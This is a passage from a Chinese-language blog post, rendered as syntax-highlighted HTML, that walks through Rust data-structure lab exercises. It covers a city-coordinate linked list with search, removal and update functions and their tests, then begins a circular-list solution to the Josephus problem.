    <span class="token punctuation">(</span><span class="token punctuation">(</span>x2 <span class="token operator">-</span> x1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">powi</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token punctuation">(</span>y2 <span class="token operator">-</span> y1<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">powi</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_find_with_distance</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"xianggang"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10.0</span><span class="token punctuation">,</span><span class="token number">10.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">let</span> test1 <span class="token operator">=</span> head<span class="token punctuation">.</span><span class="token function">find_with_distance</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">5.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>test1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>test1<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">as_ref</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_distance</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">None</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>接下来是删除，事情没有那么简单，需要根据下一项的值确定具体操作，先写一下第一版：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">remove_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> next <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> next<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name <span class="token operator">==</span> name<span class="token punctuation">&#123;</span>
            node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> next<span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            current <span class="token operator">=</span> next<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>以上代码写得一点都不锈，不仅到处是红红的报错，而且用到了unwrap，这意味着如果值为None会直接panic，同时实际上跳过了first节点的检查</p>
<pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">remove_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">None</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name <span class="token operator">==</span> name <span class="token punctuation">&#123;</span>
            <span class="token keyword">self</span><span class="token punctuation">.</span>first <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 删除头结点</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> <span class="token keyword">mut</span> next <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>next_node<span class="token punctuation">)</span> <span class="token operator">=</span> next <span class="token punctuation">&#123;</span>
            <span class="token keyword">if</span> name <span class="token operator">==</span> next_node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">&#123;</span>
                node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> next_node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">take</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">return</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">break</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_remove_with_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"xianggang"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">10.0</span><span class="token punctuation">,</span><span class="token number">10.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">remove_with_name</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">remove_with_name</span><span class="token punctuation">(</span><span class="token string">"xianggang"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4.0</span><span class="token punctuation">,</span> <span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"xianggang"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1.0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这一版至少可以顺利通过测试了</p>
<p>最后一部分，根据name修改坐标：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">update_with_name</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">mut</span> <span class="token keyword">self</span><span class="token punctuation">,</span> name<span class="token punctuation">:</span> <span class="token class-name">String</span><span class="token punctuation">,</span> p_x<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">,</span> p_y<span class="token punctuation">:</span> <span class="token keyword">f64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> <span class="token keyword">self</span><span class="token punctuation">.</span>first<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span> <span class="token operator">=</span> current <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> name <span class="token operator">==</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>city_name<span class="token punctuation">&#123;</span>
            node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_x <span class="token operator">=</span> p_x<span class="token punctuation">;</span>
            node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>p_y <span class="token operator">=</span> p_y<span class="token punctuation">;</span>
            <span class="token keyword">return</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
            current <span class="token operator">=</span> node<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token attribute attr-name">#[test]</span>
<span class="token keyword">fn</span> <span class="token function-definition function">test_update_with_name</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> head <span class="token operator">=</span> <span class="token class-name">Head</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"beijing"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">0.0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">insert</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">4.0</span><span class="token punctuation">,</span><span class="token number">4.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    head<span class="token punctuation">.</span><span class="token function">update_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1.0</span><span class="token punctuation">,</span><span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token macro property">assert_eq!</span><span class="token punctuation">(</span>head<span class="token punctuation">.</span><span class="token function">find_with_name</span><span class="token punctuation">(</span><span class="token string">"tianjin"</span><span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1.0</span><span class="token punctuation">,</span> <span class="token number">2.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
<h2 id="实验二：约瑟夫环"><a href="#实验二：约瑟夫环" class="headerlink" title="实验二：约瑟夫环"></a>实验二：约瑟夫环</h2><pre class="line-numbers language-text" data-language="text"><code class="language-text">[问题描述
约瑟夫(Joseph)问题的一种描述是:编号为 1、2、…、n的n个人按顺时针方向围坐一圈，每人持有一个密码(正整数)。一开始任选一个正整数作为报数上限值 m，从第1个人开始按顺时针方向自1开始顺序报数，报到m时停止报数。报m 的人出列，将 TA 的密码作为新的 m 值，从 TA在顺时针方向上的下一个人开始重新从1报数，如此下去，直至所有人全部出列为止。试设计一个程序求出出列顺序。
[基本要求]
利用单向循环链表存储结构模拟此过程，按照出列的顺序打印出各人的编号
[测试数据]
m 的初值为 20:密码:3，1，7，2，4，8，4(正确的结果应为6，1，4，7，2，3，5)
[实现提示]
程序运行后首先要求用户指定初始报数上限值，然后读取各人的密码。设n≤30。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>依旧是先定义链表结构：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">type</span> <span class="token type-definition class-name">Link</span> <span class="token operator">=</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Rc</span><span class="token operator">&lt;</span><span class="token class-name">RefCell</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span><span class="token punctuation">&#123;</span>
    index <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
    key <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
    next<span class="token punctuation">:</span> <span class="token class-name">Link</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>index记录编号（可省略），key记录密码</p>
<p>循环链表就需要循环引用，在rust里并不是一件容易实现的事，比如直接来：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span>num <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">let</span> <span class="token keyword">mut</span> new_node <span class="token operator">=</span> <span class="token class-name">Node</span><span class="token punctuation">&#123;</span>index <span class="token punctuation">:</span> num<span class="token punctuation">,</span> key <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span> next<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    new_node<span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Option</span><span class="token punctuation">::</span><span class="token class-name">Some</span><span class="token punctuation">(</span><span class="token class-name">Rc</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">RefCell</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span>new_node<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    new_node
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><br>new_node的所有权已经转移到了next字段，怎么还能返回呢？利用智能指针的封装可以避免这个问题，同时为了后续操作方便，增加一个头节点，保留循环链表的尾指针：<br><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>rc<span class="token punctuation">::</span></span><span class="token class-name">Rc</span><span class="token punctuation">;</span>
<span class="token keyword">use</span> <span class="token namespace">std<span class="token punctuation">::</span>cell<span class="token punctuation">::</span></span><span class="token class-name">RefCell</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token type-definition class-name">Node</span> <span class="token punctuation">&#123;</span>
    index <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
    key <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
    next<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Rc</span><span class="token operator">&lt;</span><span class="token class-name">RefCell</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">struct</span> <span class="token type-definition class-name">CircularList</span> <span class="token punctuation">&#123;</span>
    len <span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">,</span>
    tail<span class="token punctuation">:</span> <span class="token class-name">Option</span><span class="token operator">&lt;</span><span class="token class-name">Rc</span><span class="token operator">&lt;</span><span class="token class-name">RefCell</span><span class="token operator">&lt;</span><span class="token class-name">Node</span><span class="token operator">>></span><span class="token operator">></span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">impl</span> <span class="token class-name">CircularList</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">new</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">Self</span> <span class="token punctuation">&#123;</span>
        <span class="token class-name">CircularList</span> <span class="token punctuation">&#123;</span>
            len <span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
            tail<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 创建单节点循环链表</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">new_single_node</span><span class="token punctuation">(</span>key<span class="token punctuation">:</span> <span class="token keyword">usize</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">Self</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">let</span> node <span class="token operator">=</span> <span class="token class-name">Rc</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">RefCell</span><span class="token punctuation">::</span><span class="token function">new</span><span class="token punctuation">(</span><span class="token class-name">Node</span> <span class="token punctuation">&#123;</span>
            index<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
            key<span class="token punctuation">,</span>
            next<span class="token punctuation">:</span> <span class="token class-name">None</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">// 关键：让节点的 next 指向自己</span>
        node<span class="token punctuation">.</span><span class="token function">borrow_mut</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next <span class="token operator">=</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">CircularList</span> <span class="token punctuation">&#123;</span>
            len <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
            tail<span class="token punctuation">:</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>node<span class="token punctuation">)</span><span class="token punctuation">,</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token comment">// 遍历链表</span>
    <span class="token keyword">fn</span> <span class="token function-definition function">traverse</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token keyword">let</span> <span class="token class-name">Some</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">self</span><span class="token punctuation">.</span>tail <span class="token punctuation">&#123;</span>
            <span class="token keyword">let</span> <span class="token keyword">mut</span> current <span class="token operator">=</span> head<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">loop</span> <span class="token punctuation">&#123;</span>
                <span class="token macro property">println!</span><span class="token punctuation">(</span><span class="token string">"Data: &#123;&#125;"</span><span class="token punctuation">,</span> current<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>index<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">let</span> next <span class="token operator">=</span> current<span class="token punctuation">.</span><span class="token function">borrow</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">.</span><span class="token function">clone</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">unwrap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                current <span class="token operator">=</span> next<span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>

<span class="token punctuation">&#125;</span>
<span class="token attribute attr-name">#[cfg(test)]</span>
<span class="token keyword">mod</span> <span class="token module-declaration namespace">tests</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">use</span> <span class="token keyword">crate</span><span class="token punctuation">::</span><span class="token class-name">CircularList</span><span class="token punctuation">;</span>

    <span class="token attribute attr-name">#[test]</span>
